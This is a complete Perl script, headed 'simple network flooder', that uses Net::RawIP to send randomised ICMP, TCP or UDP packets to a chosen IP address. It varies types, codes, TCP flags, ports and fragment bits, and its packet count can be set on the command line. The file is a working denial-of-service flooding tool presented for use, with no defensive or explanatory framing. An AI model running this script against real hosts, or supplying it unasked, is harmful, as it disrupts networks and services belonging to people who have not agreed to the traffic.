#!/usr/bin/perl -w
# =================================================
# simple network flooder script
# takes type of flood (icmp, tcp, udp) as param
# optionally takes dest ip and packet count
# =================================================
my $VERSION = 0.5;
# =================================================
use strict;
use Net::RawIP;
 
my $flood = shift or &usage();
my $dstip = shift || '127.0.0.1';
my $pktct = shift || 100;
 
&icmpflood($dstip, $pktct) if $flood =~ 'icmp';
&tcpflood($dstip, $pktct) if $flood =~ 'tcp';
&udpflood($dstip, $pktct) if $flood =~ 'udp';
 
sub icmpflood() {
   my($dstip, $pktct, $code, $type, $frag);
   $dstip = shift;
   $pktct = shift;
 
   print "\nstarting flood to $dstip\n";
   for(my $i=0; $i <= $pktct; $i++) {
 
      $code = int(rand(255));
      $type = int(rand(255));
      $frag = int(rand(2));
 
      my $packet = new Net::RawIP({
         ip => {
            daddr => $dstip,
            frag_off => $frag,
         },
         icmp => {
            code => $code,
            type => $type,
         }
      });
 
      $packet->send;
      print "sent icmp $type->$code, frag: $frag\n";
   }
   print "\nflood complete\n\n";
}
 
sub tcpflood() {
   my($dstip, $pktct, $sport, $dport, $frag, $urg, $psh, $rst, $fin,
$syn, $ack);
   $dstip = shift;
   $pktct = shift;
   print "\nstarting flood to $dstip\n";
   for(my $i=0; $i <= $pktct; $i++) {
 
      $sport = int(rand(65535));
      $dport = int(rand(65535));
      $frag = int(rand(2));
      $urg = int(rand(2));
      $psh = int(rand(2));
      $rst = int(rand(2));
      $fin = int(rand(2));
      $syn = int(rand(2));
      $ack = int(rand(2));
 
      my $packet = new Net::RawIP({
         ip => {
            daddr => $dstip,
            frag_off => $frag,
         },
         tcp => {
            source => $sport,
            dest => $dport,
            urg => $urg,
            psh => $psh,
            rst => $rst,
            fin => $fin,
            syn => $syn,
            ack => $ack,
         }
      });
 
      $packet->send;
      print "sent tcp packet from $sport to $dport, frag: $frag, psh:
$psh, rst: $rst, fin: $fin, syn: $syn, ack: $ack\n";
   }
   print "\nflood complete\n\n";
}
 
sub udpflood() {
   my($dstip, $pktct, $sport, $dport, $frag);
   $dstip = shift;
   $pktct = shift;
 
   print "\nstarting flood to $dstip\n";
   for(my $i=0; $i <= $pktct; $i++) {
 
      $sport = int(rand(255));
      $dport = int(rand(255));
      $frag = int(rand(2));
 
      my $packet = new Net::RawIP({
         ip => {
            daddr => $dstip,
            frag_off => $frag,
         },
         udp => {
            source => $sport,
            dest => $dport,
         }
      });
 
      $packet->send;
      print "sent udp packet from $sport to $dport, frag: $frag\n";
   }
   print "\nflood complete\n\n";
}
 
sub usage() {
   print "
need to set a valid flood type (one of icmp, tcp, udp)
optionally set dest ip and packetcount
 
example:
 
   $0 [tcp udp icmp] <destip> <packetcount>\n\n";
   exit 0;
}
